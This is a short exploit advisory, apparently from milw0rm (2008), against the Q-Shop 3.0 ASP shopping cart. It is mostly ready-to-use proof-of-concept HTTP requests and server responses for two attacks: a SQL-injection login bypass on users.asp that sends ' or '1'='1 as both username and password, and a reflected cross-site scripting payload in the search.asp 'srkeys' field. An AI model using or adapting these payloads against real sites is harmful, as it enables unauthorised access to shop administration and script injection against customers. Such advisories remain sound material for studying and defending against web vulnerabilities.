@@ -1,0 +1,104 @@
+000000  00000     0000    0000  000  00 000000  0000000   0000  000000  00000
+ 0    0   0      0    0  0    0  0   0   0    0  0    0  0    0  0    0  0   0
+ 0    0   0     0  00 0 0        0  0    0    0  0      0  00 0  0    0  0    0
+ 0    0   0     0 0 0 0 0        0  0    0    0  0  0   0 0 0 0  0    0  0    0
+ 00000    0     0 0 0 0 0        0 0     00000   0000   0 0 0 0  00000   0    0
+ 0    0   0     0 0 0 0 0        000     0    0  0  0   0 0 0 0  0  0    0    0
+ 0    0   0     0  000  0        0  0    0    0  0      0  000   0  0    0    0
+ 0    0   0   0  0       0    0  0   0   0    0  0    0  0       0   0   0   0
+000000  0000000   000     0000  000  00 000000  0000000   000   000  00 00000
+
+
+
+[+] Script               : Q-Shop v 3.0 (Maybe prior versions also)
+
+[+] Exploit Type         : Multiple Exploits (XSS + Remote Login Bypass)
+
+[+] Script's Homepage    : http://quadcomm.com/qshop/
+
+[+] Script's Description : ('Q-Shop is a fully featured shopping system including: full catalog browsing system, Shopping cart, User purchase history generation, web based catalog administration, web based order administration, web based user management and many more features. Supports MS Access and MS SQL Server. Full ASP source code included.')
+
+[+] Script's Price       : $249 USD
+
+
+--//--> Exploit : 
+
+1) Remote login bypass :
+
+http://[website]/[script]/users.asp 
+
+PoC : 
+
+Host: www.[website].cc
+User-Agent: Blackness Lynx/1.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www.[website].cc/[script]/users.asp
+Cookie: ASPSESSIONIDACADTDQS=KPALCBJDEKLJOPFDAGIFIFBJ
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 66
+
+UserID=%27+or+%271%27%3D%271&Pwd=%27+or+%271%27%3D%271&Login=[ok]
+
+HTTP/1.x 200 OK
+Cache-Control: private
+Date: Sat, 15 Nov 2008 19:58:02 GMT
+Content-Length: 31227
+Content-Type: text/html
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+
+In simple words :
+
+
+userID = ' or '1'='1
+
+Pwd    = ' or '1'='1
+
+
+2) Remote XSS exploit : 
+
+
+
+PoC : 
+
+http://[website]/[script]/search.asp
+
+POST /q-shop/search.asp HTTP/1.1
+Host: [website]
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.0.4) Gecko/2008102920 Firefox 3.0.3
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://[website]/[script]/search.asp
+Cookie: ASPSESSIONIDACADTDQS=KPALCBJDEKLJOPFDAGIFIFBJ
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+srkeys=%3Cscript%3Ealert%28%27Bl%40ckbe%40rD+is+not+yet+%21%27%29%3C%2Fscript%3E&Criteria=OR&CATS=ALL&x=8&y=18&MinPrice=&MaxPrice=
+
+HTTP/1.x 200 OK
+Cache-Control: private
+Date: Sat, 15 Nov 2008 20:08:01 GMT
+Content-Length: 66513
+Content-Type: text/html
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+
+
+In simple words :
+
+http://[website]/[script]/search.asp 
+
+POST data : srkeys=<script>alert('Bl@ckbe@rD is not dead yet')</script>
+
+
+[Peace xD ]
+
+# milw0rm.com [2008-11-17]
